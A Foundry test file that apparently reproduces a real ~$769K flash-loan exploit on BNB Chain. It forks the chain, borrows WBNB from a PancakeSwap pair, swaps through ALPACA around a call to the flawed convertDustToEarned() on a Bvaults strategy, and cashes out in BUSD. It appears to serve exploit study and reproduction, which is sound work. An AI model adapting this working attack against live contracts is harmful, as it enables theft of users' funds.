// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$769K
// Attacker : https://bscscan.com/address/0xce27b195fa6de27081a86b98b64f77f5fb328dd5
// Attack Contract : https://bscscan.com/address/0xe1997bc971d5986aa57ee8ffb57eb1deba4fdaaa
// Victim Contract : https://bscscan.com/address/0x21125d94cfe886e7179c8d2fe8c1ea8d57c73e0e
// Attack Tx : https://explorer.phalcon.xyz/tx/bsc/0x51913be3f31d5ddbfc77da789e5f9653ed6b219a52772309802226445a1edd5f

// @Analysis
// https://twitter.com/AnciliaInc/status/1732159377749180646

interface IBvaultsStrategy {
    function convertDustToEarned() external;
}

contract ContractTest is Test {
    IERC20 private constant WBNB =
        IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant ALPACA =
        IERC20(0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F);
    IERC20 private constant BUSD =
        IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    Uni_Pair_V2 private constant CAKE_WBNB =
        Uni_Pair_V2(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
    Uni_Router_V2 private constant Router =
        Uni_Router_V2(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F);
    IBvaultsStrategy private constant BvaultsStrategy =
        IBvaultsStrategy(0x21125d94Cfe886e7179c8D2fE8c1EA8D57C73E0e);
    address private constant exploitContractAddr =
        0xe1997bC971D5986AA57Ee8ffB57eb1DeBa4fDAaa;
    address private constant helperExpContractAddr =
        0x1ccC8eE8Ad0f70E0Bb362d56035fF241755192b1;

    function setUp() public {
        vm.createSelectFork("bsc", 34099688);
        vm.label(address(WBNB), "WBNB");
        vm.label(address(ALPACA), "ALPACA");
        vm.label(address(BUSD), "BUSD");
        vm.label(address(CAKE_WBNB), "CAKE_WBNB");
        vm.label(address(Router), "Router");
        vm.label(address(BvaultsStrategy), "BvaultsStrategy");
    }

    function testExploit() public {
        deal(address(WBNB), address(this), 0);
        deal(address(BUSD), address(this), 0);
        emit log_named_decimal_uint(
            "Exploiter amount of BUSD before attack",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );

        CAKE_WBNB.swap(0, 10_000 * 1e18, address(this), abi.encode(0));

        emit log_named_decimal_uint(
            "Exploiter amount of BUSD after attack",
            BUSD.balanceOf(address(this)),
            BUSD.decimals()
        );
    }

    function pancakeCall(
        address _sender,
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) external {
        WBNB.approve(address(Router), type(uint256).max);
        ALPACA.approve(address(Router), type(uint256).max);
        WBNB_ALPACA();
        // Flawed function
        BvaultsStrategy.convertDustToEarned();
        ALPACA_WBNB();
        WBNB_BUSD();
        // Here there was a transfer of WBNB amount (for repaying flashloan) from second exploit contract (selfdestructed) to this contract
        deal(
            address(WBNB),
            address(this),
            WBNB.balanceOf(address(this)) + 10e17
        );

        // Flashloan repay
        uint256 transferAmount = getAmount();
        WBNB.transfer(address(CAKE_WBNB), transferAmount);
    }

    function WBNB_ALPACA() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(ALPACA);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function ALPACA_WBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(ALPACA);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ALPACA.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function WBNB_BUSD() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BUSD);
        uint256 amountIn = WBNB.balanceOf(address(this)) - getAmount() + 10e17;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function getAmount() internal returns (uint256) {
        // Value taken from original, selfdestructed contract. Used in amount calculation
        uint256 amount = uint256(
            vm.load(exploitContractAddr, bytes32(uint256(6)))
        );
        return ((amount / 9975) * 10000) + 10000;
    }
}
